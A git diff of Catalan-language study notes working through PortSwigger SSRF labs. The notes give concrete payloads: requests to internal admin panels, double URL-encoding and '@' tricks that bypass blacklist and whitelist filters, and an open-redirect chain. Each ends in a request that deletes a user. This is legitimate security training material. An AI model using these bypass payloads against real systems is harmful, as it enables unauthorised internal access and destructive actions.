@@ -30,6 +30,7 @@
         - Start Attack
         - Veiem que tots dona un status code 400. Menys al número 70. Dona un 200.
     - FEM: stockApi=http://192.168.0.70:8080/admin&storeId=1
+    
     - RESULTAT: stockApi=http://192.168.0.70:8080/admin/delete?username=carlos&storeId=1
 
 ## **Lab 3**: SSRF with blacklist-based input filter
@@ -39,6 +40,7 @@
         - PROVEM: stockApi=http://127.1/admin
         - URL DECODE de 'a' = stockApi=http://127.1/%61dmin
         - URL DECODE de '%' = stockApi=http://127.1/%2561dmin
+    
     - RESULTAT: stockApi=http://127.1/%2561dmin/delete?username=carlos
 
 ## **Lab 4**: SSRF with filter bypass via open redirection vulnerability
@@ -49,13 +51,26 @@
     - TENIM: GET /product/nextProduct?currentProductId=2&path=/product?productId=3 HTTP/1.1
         - PROVEM A: GET /product/nextProduct?currentProductId=2&path=https:/google.es HTTP/1.1 -> Ens esta fent la redirecció cap a Google.
     - FEM: stockApi=/product/nextProduct?currentProductId=2%26path=http://192.168.0.12:8080/admin
+    
     - RESULTAT: stockApi=/product/nextProduct?currentProductId=2%26path=http://192.168.0.12:8080/admin/delete?username=carlos
 
 ## **Lab 5**: Blind SSRF with out-of-band detection
 
+    NEED BurpSuite Collaborator Client (Pro Version) - Pagant €
 
 ## **Lab 6**: SSRF with whitelist-based input filter
 
+    - TENIM: stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
+    - URL DECODE: stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
+    - PROVEM: stockApi=http://localhost:8080
+        - OUTPUT: "External stock check host must be stock.weliketoshop.net"
+    - PROVEM: stockApi=http://localhost#@stock.weliketoshop.net:8080
+      - URL DECODE 1: stockApi=http://localhost%23@stock.weliketoshop.net:8080
+      - URL DECODE 2: stockApi=http://localhost%2523@stock.weliketoshop.net:8080 -> STATUS CODE 200 (estem a l'Admin Panel)
+    -  FEM: stockApi=http://localhost%2523@stock.weliketoshop.net:8080/admin
+    
+    -  RESULTAT: stockApi=http://localhost%2523@stock.weliketoshop.net:8080/admin/delete?username=carlos
 
 ## **Lab 7**: Blind SSRF with Shellshock exploitation
 
+    NEED BurpSuite Collaborator Client (Pro Version) - Pagant €
